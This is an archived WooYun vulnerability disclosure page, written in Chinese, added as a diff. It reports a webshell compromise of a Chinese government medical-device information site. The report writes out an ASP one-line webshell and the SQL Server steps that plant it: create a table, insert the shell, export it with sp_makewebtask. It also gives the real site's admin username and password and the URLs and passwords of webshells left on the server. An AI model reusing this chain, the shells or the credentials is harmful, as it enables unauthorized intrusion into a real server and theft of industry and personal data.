@@ -1,0 +1,264 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		国家食品药品监督管理局下属某网站注入点拿shell(行业信息受到安全威胁)  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		国家食品药品监督管理局下属某网站注入点拿shell(行业信息受到安全威胁)  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/nauscript">nauscript</a> 
+</li><li>提交时间：		2013-07-30 17:50</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-07-30：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-08-03：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-08-13：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-08-23：	细节向普通白帽子公开<br/>
+									2013-09-02：	细节向实习白帽子公开<br/>
+									2013-09-13：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">一个通过MYSQL建表拿webshell和另类绕过防注入的案例</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">国家食品药品监督管理局信息中心主办的-----中国医疗器械信息网(CMDI)<br />
+<br />
+网站:http://www.cmdi.gov.cn<br />
+<br />
+</p><p class="detail"><a href="../images/2811041617092bba938499ca1ea41b6a2c0854d2.jpg" target="_blank"><img src="../images/2811041617092bba938499ca1ea41b6a2c0854d2.jpg" alt="0.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+#---#一句话引出的线索<br />
+<br />
+通过Google hack搜索到了这样一个asp文件<br />
+<br />
+http://www.cmdi.gov.cn:5555/tz/test.asp<br />
+<br />
+</p><p class="detail"><a href="../images/2811144237a571ae1628f5a7583772fc4da5cd2a.jpg" target="_blank"><img src="../images/2811144237a571ae1628f5a7583772fc4da5cd2a.jpg" alt="1.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+似乎并没有什么特别,但是他的底下的<br />
+<br />
+</p><pre><code>%3c%25execute request(%22@%22)%25%3e</code></pre><p class='detail'>刺激到了我敏感的神经,不错,是一句话!不过是unicode格式的,转换过来应该是<br />
+<br />
+</p><pre><code>&lt;%execute request(&quot;@&quot;)%&gt;</code></pre><p class='detail'> 密码是@,显然这是通过sql命令在数据库建表插入一句话后的成果，看了一下这个asp文件的源码，其中tittle显示“Microsoft SQL Server Web 助手”也更加印证了我的猜测<br />
+<br />
+</p><p class="detail"><a href="../images/281121295bda8a2396553ca46b6032c3930bb969.jpg" target="_blank"><img src="../images/281121295bda8a2396553ca46b6032c3930bb969.jpg" alt="1.1.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+看来这个站已经有人光临了。<br />
+<br />
+<br />
+<br />
+#---#另类绕过防注入<br />
+<br />
+那么既然是通过数据库建表，那么一定注入没错，信心满满的把http://www.cmdi.gov.cn用工具跑了一圈，居然没有可利用的注入点，蒙了。<br />
+<br />
+但是我马上想到了刚才那个文件是出自http://www.cmdi.gov.cn:5555，先访问之，居然目录遍历了，还有一个“sql防注入工具”的文件夹<br />
+<br />
+</p><p class="detail"><a href="../images/281128091ac7dd212728cc460c980fbaab22c24a.jpg" target="_blank"><img src="../images/281128091ac7dd212728cc460c980fbaab22c24a.jpg" alt="4.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+怪不得呢，那就拿http://www.cmdi.gov.cn:5555跑一圈，此时这个防注入工具似乎不起作用了，果然找到了我想要的，轻松射入，拿下数据库<br />
+<br />
+<br />
+<br />
+#---#MYSQL建表拿webshell<br />
+<br />
+有三个数据库，果不其然，在cmdi_db数据库中发现了test表，其中正是我们在前面看到的一句话<br />
+<br />
+</p><p class="detail"><a href="../images/28122424fb42a094860f7b011b64e6e6f2095249.jpg" target="_blank"><img src="../images/28122424fb42a094860f7b011b64e6e6f2095249.jpg" alt="5.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+那他是如何做到传大马的呢？根据上面我们已经获得的这些信息可以很轻松的还原当时的渗透过程<br />
+<br />
+1、首先在其得到数据库后通过sql命令先新建一个test表，字段pc，字段类型为字符型长度为255<br />
+<br />
+命令如下：</p><pre><code>create table test(pc char(255))</code></pre><p class='detail'><br />
+<br />
+2、然后为字段赋值一句话，密码为@<br />
+<br />
+</p><pre><code>insert into test(pc) values (&#039;&lt;%execute request(&quot;@&quot;)%&gt;&#039;)</code></pre><p class='detail'><br />
+<br />
+3、由于要在链接地址提交，因此要将一句话转换成unicode格式，也就是我们最开始看到的%3c%25execute request(%22@%22)%25%3e<br />
+<br />
+sql命令变为：</p><pre><code>insert into test(pc) values (&#039;%3c%25execute request(%22@%22)%25%3e&#039;)</code></pre><p class='detail'><br />
+<br />
+4、然后将test表导出为asp文件，也就是我们刚开始搜索到的那个test.asp文件<br />
+<br />
+命令：</p><pre><code>execute sp_makewebtask @outputfile=&#039;E:\Lotus\Domino\data\sbl\CMDI\tz\test.asp&#039;,@query=&#039;select pc from test&#039;</code></pre><p class='detail'><br />
+<br />
+在这里，路径就是你导出asp一句话文件的地方，而之前幸运的在那个可以遍历的目录里找到了几个显错的asp文件显示了路径<br />
+<br />
+不过从之前发现这个test.asp文件的目录里一些上传的asp文件和日期可以看出，这位黑客并不是一次成功的<br />
+<br />
+<br />
+<br />
+用得到的大马一看，服务器很好拿，权限高、端口开的多<br />
+<br />
+</p><p class="detail"><a href="../images/281314382cafc81cc3ed74c2abb3e3330f7e3ef7.jpg" target="_blank"><img src="../images/281314382cafc81cc3ed74c2abb3e3330f7e3ef7.jpg" alt="3_副本.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/281303058c2e5e00df9fc82bb49cc49174a9d4f0.jpg" target="_blank"><img src="../images/281303058c2e5e00df9fc82bb49cc49174a9d4f0.jpg" alt=".jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+找到一个管理入口http://www.cmdi.gov.cn:5555/work/EXPOCHECK.ASP<br />
+<br />
+用户名和密码（sbl ylqx831   方便验证，请修改）居然没问显示着，就跟个后门似的 </p><p class="detail"><a href="../images/28130533b4863d247c218169806a25ac5756212f.jpg" target="_blank"><img src="../images/28130533b4863d247c218169806a25ac5756212f.jpg" alt="2.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+里面存在着大量的企业、以及行业从业人员的信息，影响全国整个医疗器械行业！<br />
+<br />
+</p><p class="detail"><a href="../images/281310042744962eb2312fcac9a1b0f54bd41679.jpg" target="_blank"><img src="../images/281310042744962eb2312fcac9a1b0f54bd41679.jpg" alt="6.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+当然，服务器上还仍有许多资料信息，入侵将会给该行业信息安全带来威胁，并且在渗透过程中发现先前进入的这位黑客有篡改网站文件等行为，这种行为是白帽子所不耻的，强烈谴责这种行为，也希望网站管理方国家食品药品监督管理局信息中心能及时修复漏洞。<br />
+<br />
+<br />
+<br />
+看在我花一早上时间写完突然断电又重写的份上，加个精？本来写的比这个详细，丢了就没心思继续了。。。。 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">留下两个webshell方便乌云审核人员审核，向你们致敬！<br />
+<br />
+http://www.cmdi.gov.cn:5555/systemsqldb.asp   mumaasp.com<br />
+<br />
+同时支持aspx文件<br />
+<br />
+http://www.cmdi.gov.cn:5555/test.aspx      admin<br />
+<br />
+<br />
+<br />
+ </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">服务器设置 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/nauscript" title="nauscript">nauscript</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-032589" title="国家食品药品监督管理局下属某网站注入点拿shell(行业信息受到安全威胁)">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：12 </p>
+													<p class="detail">确认时间：2013-08-03 17:21</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail"> </p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="32589";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
